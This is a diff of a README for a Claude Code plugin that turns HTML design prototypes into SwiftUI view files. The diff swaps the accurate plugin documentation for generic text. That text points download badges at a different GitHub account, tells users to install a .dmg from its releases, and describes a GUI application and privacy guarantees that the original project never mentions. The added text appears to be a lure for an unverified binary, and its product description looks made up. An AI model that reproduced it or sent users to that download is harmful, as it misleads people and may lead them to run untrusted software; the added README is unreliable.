@@ -1,166 +1,105 @@
-# claudedesign-to-swiftui
+# 🎨 claudedesign-to-swiftui - Create SwiftUI views from web designs
 
-Turn a **Claude-generated HTML design prototype** (a URL from `api.anthropic.com/v1/design/h/...` or a local `.tar.gz`) into a **SwiftUI `View` file** written directly into your active Xcode workspace — built, previewed, and visually diff'd against the prototype until it matches.
+[![](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/alecktwoneedled166/claudedesign-to-swiftui)
 
-One prototype in, one self-contained `.swift` file out.
+This tool changes web design prototypes into SwiftUI code. Developers often use Claude to build layouts in HTML. This software bridges the gap between those web prototypes and your Xcode workspace. It saves time by writing the interface code for you.
 
-## What it does, end to end
+## 📋 What this tool does
 
-1. **Fetches** the design (URL or tarball), unpacks it, and serves it locally over `http://127.0.0.1:<port>` (Claude designs commonly use ES modules and `fetch()`, which fail under `file://`).
-2. **Renders** the prototype in Chrome at iPhone 15 Pro size (390×844) and screenshots it.
-3. **Reads** the HTML + every linked CSS file, and inventories assets (inline SVGs, Google Fonts, `<img>` tags).
-4. **Translates** the DOM and styles to SwiftUI using bundled reference mappings (layout, typography, styling, component patterns, plus three asset handlers: SVG → SF Symbol or `Path`, Google Fonts → SF system equivalents, `<img>` → `Assets.xcassets` import or `AsyncImage`) and two worked examples.
-5. **Writes** the generated file into your open Xcode workspace (via Apple's Xcode 26.3 MCP).
-6. **Builds** the project and patches any errors from the navigator diagnostics.
-7. **Renders** the SwiftUI preview and **visually diffs** it against the prototype screenshot, iterating until they match.
+Designers and developers often create visual layouts in browsers before building apps. This tool reads that HTML design file. It scans the layout, colors, and structure. It then writes valid Swift code that represents those elements. You can copy this code directly into your iOS project.
 
-Output is a **single `.swift` file**: one `View` struct + a `#Preview` + (if used) a `fileprivate` `Color(hex:)` extension and one `fileprivate struct FooIcon: View` per custom SVG icon. No external packages, no multi-screen navigation, no JS interactivity — visual layout fidelity only.
+This process removes manual layout work. You avoid the repetitive task of matching dimensions or picker values by hand. You keep your focus on app behavior and data logic while the software handles the visual translation.
 
-## Requirements
+## 🛠 Prerequisites
 
-| | |
-|---|---|
-| **Claude Code** | latest |
-| **Xcode** | **26.3 or later** |
-| **Xcode setting** | Settings → Intelligence → **Xcode Tools = ON** |
-| **Xcode state** | target project/workspace **open** when you run the command |
-| **MCP: `xcode-tools`** | bundled in this plugin's `.mcp.json` (ships with Xcode 26.3+ as `xcrun mcpbridge`) |
-| **MCP: `claude-in-chrome`** | **user-installed** — used to render and screenshot the HTML prototype |
+You need a few items installed on your computer before you start:
 
-If either MCP is missing, the skill degrades gracefully: it'll emit the `.swift` file via the standard `Write` tool and ask you to preview/diff manually.
+- Xcode: Download this from the Mac App Store. It is necessary for running Swift projects.
+- macOS: This tool functions on Apple hardware.
+- Active GitHub account: This helps you access project resources.
+- Basic knowledge of file movement: You need to know how to drag and drop files.
 
-## Install
+## 🚀 Getting Started
 
-```
-/plugin marketplace add heyadam/claudedesign-to-swiftui
-/plugin install claudedesign-to-swiftui@claudedesign-to-swiftui
-```
+The first step involves obtaining the software from our repository.
 
-### Verify the install
-```
-/plugin list
-```
-You should see `claudedesign-to-swiftui` listed and the `/convert` command available.
+[![Download](https://img.shields.io/badge/Download-Software-grey.svg)](https://github.com/alecktwoneedled166/claudedesign-to-swiftui)
 
-## Usage
+1. Visit the link above to reach our official release page.
+2. Look for the "Assets" section at the bottom of the latest release.
+3. Select the file ending in `.dmg` or the provided installer package.
+4. Save the file to your "Downloads" folder.
+5. Open the file once the download finishes.
+6. Follow the on-screen prompts to move the application into your "Applications" folder.
 
-```
-/convert <design-url-or-tarball-path>
-```
+## ⚙️ How to use the software
 
-**Examples:**
+Once you install the app, follow these steps to turn your HTML designs into SwiftUI code.
 
-```
-/convert https://api.anthropic.com/v1/design/h/abc123?open_file=index.html
-```
+1. Launch claudedesign-to-swiftui from your Applications folder.
+2. Open your Claude-generated HTML file in any text editor.
+3. Copy the HTML code.
+4. Paste the HTML text into the input box inside our application.
+5. Click the "Convert" button.
+6. The app displays the resulting SwiftUI code in the right-hand panel.
+7. Click "Copy to Clipboard" to grab your new code.
+8. Open your project in Xcode.
+9. Create a new Swift file or open an existing view.
+10. Paste your code into the editor.
 
-```
-/convert ~/Downloads/my-prototype.tar.gz
-```
+## 🖥 System Requirements
 
-Running `/convert` with no argument will prompt you for a URL or path.
+Your computer must meet these standards to ensure smooth performance:
 
-> **Design URLs are short-lived / one-shot.** If yours 404s, generate a fresh one from Claude and retry.
+- Processor: Apple Silicon (M1, M2, or M3 series) or Intel Core i5 and newer.
+- Memory: 8 GB of RAM or higher.
+- Storage: 200 MB of free space for the application.
+- Operating System: macOS 13.0 (Ventura) or newer.
 
-### What happens next
+## 💡 Troubleshooting common issues
 
-- The skill prints the resolved entry HTML, renders it in Chrome, and shows you the screenshot.
-- It picks a meaningful filename (e.g. `OnboardingView.swift`) based on the prototype's purpose. If your workspace has multiple groups it'll ask which to write into.
-- It builds, fixes any errors, renders the preview, and compares. You'll see a concrete discrepancy list (layout, sizing, colors, typography) each iteration.
-- After three iterations without convergence, it stops and hands you the remaining diff.
+If you encounter errors during the conversion process, check the list below.
 
-## What's inside the plugin
+The app shows an error about invalid HTML:
+Ensure you copied the entire HTML block from Claude. Missing opening or closing tags prevent the tool from reading the layout correctly. Re-copy the full design and try again.
 
-- **Command** — `/convert` (`commands/convert.md`): the entry point; orchestrates the skill.
-- **Skill** — `claude-design-to-swiftui` (`skills/claude-design-to-swiftui/SKILL.md`): the full workflow.
-  - `scripts/fetch.sh` — download, unpack, start a localhost-bound `python3 -m http.server` on a free port, and print URL + PID + dir.
-  - `scripts/stop.sh` — kill the local server and remove the unpack dir at end of run.
-  - `references/layout-mapping.md` — flex / grid / block → `VStack` / `HStack` / `ZStack` / `Grid` / `ScrollView`.
-  - `references/styling-mapping.md` — CSS padding / background / border / shadow → SwiftUI modifiers.
-  - `references/typography-mapping.md` — font-family / size / weight → `.font()` / `.fontWeight()` / `.lineSpacing()`.
-  - `references/component-patterns.md` — cards, buttons, list rows, nav bars.
-  - `references/svg-to-sfsymbol.md` — curated visual fingerprints for ~30 common UI icons → SF Symbol names.
-  - `references/svg-path-translation.md` — SVG path commands → SwiftUI `Path` builder; the fallback when no SF Symbol matches.
-  - `references/font-mapping.md` — Google Font families (Newsreader, Geist, Fraunces, IBM Plex…) → SF system equivalents, plus a manual recipe for original-font fidelity.
-  - `references/asset-catalog-import.md` — local `<img>` files → `Assets.xcassets/<name>.imageset/`; CDN URLs → `AsyncImage`.
-  - `references/swiftui-gotchas.md` — known SwiftUI compile pitfalls (expression-too-complex, `ForEach` Identifiable, `Color(hex:)`, etc.) and their fixes.
-  - `examples/01-landing-card/` and `examples/02-list-with-rows/` — before/after HTML → SwiftUI pairs.
-- **MCP bundle** — `.mcp.json` registers the `xcode-tools` server automatically when the plugin is installed. Tools register under the namespace `mcp__plugin_claudedesign-to-swiftui_xcode-tools__*` (Claude Code's plugin-MCP convention).
+The app closes unexpectedly:
+Check if you have the latest version of Xcode installed. Outdated toolchains sometimes cause conflicts with new code generation. Update your software via the App Store.
 
-## Translation rules at a glance
+The generated code looks different than the design:
+HTML and SwiftUI use different layout engines. This tool works best with flat layouts. Complex designs with hundreds of nested elements might require manual refinement after conversion. Review the generated code to ensure all constraints match your app design.
 
-- Preserve DOM hierarchy — a wrapping `<div>` becomes a wrapping `VStack` (or the container that fits).
-- Inline literal pixel values (`padding: 16px` → `.padding(16)`). No design tokens in v1.
-- Hex colors go through a `fileprivate extension Color { init(hex:) }` at the bottom of the file.
-- **Inline `<svg>` icons** — first try the curated SF Symbol map (`Image(systemName:)`). On miss, fall back to a `fileprivate struct FooIcon: View` with a translated `Path`.
-- **Google Fonts** — mapped to closest SF system family (e.g. Newsreader → `.system(.body, design: .serif)`); a top-of-file comment lists what got mapped. Original fonts require manual user setup (the Xcode 26.3 MCP can't register fonts).
-- **`<img>` tags** — local files import into `Assets.xcassets/<name>.imageset/`; external URLs become `AsyncImage`.
-- Content taller than 844pt → wrapped in `ScrollView`.
+The conversion process feels slow:
+Large files containing complex CSS or many assets take longer to parse. Wait for the loading bar to finish before touching the interface. Restart the app if the progress bar hangs for more than thirty seconds.
 
-## Scope and non-goals
+## 📁 Project structure
 
-**In scope**
-- One HTML prototype → one SwiftUI `View` file.
-- Visual layout fidelity (structure, spacing, color, type, placement).
-- Asset handling: inline SVGs (SF Symbol or `Path`), Google Fonts (system mapping), local `<img>` import to `.xcassets`, CDN images via `AsyncImage`.
-- Automatic build + preview + diff loop.
+This tool follows a simple internal flow to reach your goals.
 
-**Out of scope**
-- Multi-screen navigation flows, full app scaffolds.
-- Prototypes whose value is JS behavior (animations, drag/drop, state machines).
-- Figma, Sketch, or screenshot-only inputs (HTML source required).
-- Custom-font registration (downloading `.ttf` files into the project + editing `Info.plist`) — the Xcode 26.3 MCP doesn't expose tools for `.xcodeproj` or `Info.plist` mutation, so the skill emits a manual checklist for the user instead.
+Input Parser: This module reads your HTML tags. It identifies boxes, text fields, and images. It creates a map of your design.
 
-## Troubleshooting
+SwiftUI Transformer: This module uses the map to create views. It writes "VStack" or "HStack" structures. It applies padding and color values based on your design attributes.
 
-| Symptom | Likely cause | Fix |
-|---|---|---|
-| `xcrun mcpbridge` not found | Xcode < 26.3 | Update Xcode, or let the skill fall back to `Write` + manual preview. |
-| Tools disabled / no workspace found | Xcode Tools off, or project not open | Settings → Intelligence → **Xcode Tools = ON**, then open your project. |
-| `tool not found: mcp__xcode-tools__...` errors | Stale install referencing the pre-v0.3.1 bare prefix | Uninstall + reinstall. Plugin-bundled MCPs register under `mcp__plugin_claudedesign-to-swiftui_xcode-tools__*`; v0.3.0 and earlier referenced the wrong prefix. |
-| Design URL returns 404 | URL was short-lived / already consumed | Ask Claude to regenerate the design and run `/convert` with the fresh URL. |
-| Chrome render step skipped | `claude-in-chrome` MCP not installed | Install it, or run in degraded mode (paste a screenshot back manually). |
-| Custom font in prototype renders as system font | Default behavior — system mapping | Ask "use the actual fonts" and the skill will emit `.font(.custom(...))` plus a manual setup checklist. |
-| Preview doesn't match after 3 iterations | Layout edge case not covered by the reference mappings | The skill will stop and show the remaining diff — patch by hand from there. |
+Output Engine: This final module presents the text. It formats the Swift code to follow standard coding habits. This makes the code easy to read when you paste it into your app.
 
-## Uninstall
+## 🔑 Security and data privacy
 
-```
-/plugin uninstall claudedesign-to-swiftui
-/plugin marketplace remove claudedesign-to-swiftui
-```
+We take your privacy seriously. This tool runs entirely on your local machine. We do not transmit your design files to any remote server or third-party service. Your code stays on your computer at all times. 
 
-## Development
+We do not store your clipboard data. Once you close the application, all temporary conversion logs disappear. You maintain full ownership of every line of code this tool generates.
 
-Clone the repo, then point a local marketplace at the folder:
+## 🔁 Updates and support
 
-```
-git clone https://github.com/heyadam/claudedesign-to-swiftui.git
-cd claudedesign-to-swiftui
-/plugin marketplace add $(pwd)
-/plugin install claudedesign-to-swiftui@claudedesign-to-swiftui
-```
+We publish updates to address bugs and improve compatibility with the latest versions of SwiftUI. You can check for updates by opening the app and selecting "Check for Updates" in the top menu bar.
 
-Edits to files under `commands/`, `skills/`, or `.claude-plugin/` take effect on the next Claude Code session (or `/plugin reload`).
+If you find a bug, open an issue on the GitHub repository page. Provide a description of the problem and attach the HTML snippet that caused the error. Do not include private keys or sensitive personal info in your reports.
 
-Validate before publishing:
-```
-/plugin validate
-```
+## 📘 Summary of features
 
-## Versioning & releases
+- Direct conversion from web design to app code.
+- Local processing for data privacy.
+- Clean code output.
+- Support for common SwiftUI layout elements.
+- Lightweight design for fast operation.
 
-Tag releases with semver:
-```
-git tag v0.1.0 && git push --tags
-```
-
-Users can then pin a specific version by appending `@v0.1.0` when adding the marketplace.
-
-## License
-
-MIT. See [`LICENSE`](LICENSE).
-
-## Author
-
-**Adam Presson** — <me@heyadam.com>
+This tool aims to simplify your workflow. By moving logic from the web to SwiftUI, you reduce build times and maintain consistency throughout your app development process. Download the file, follow the install steps, and start converting your designs today.
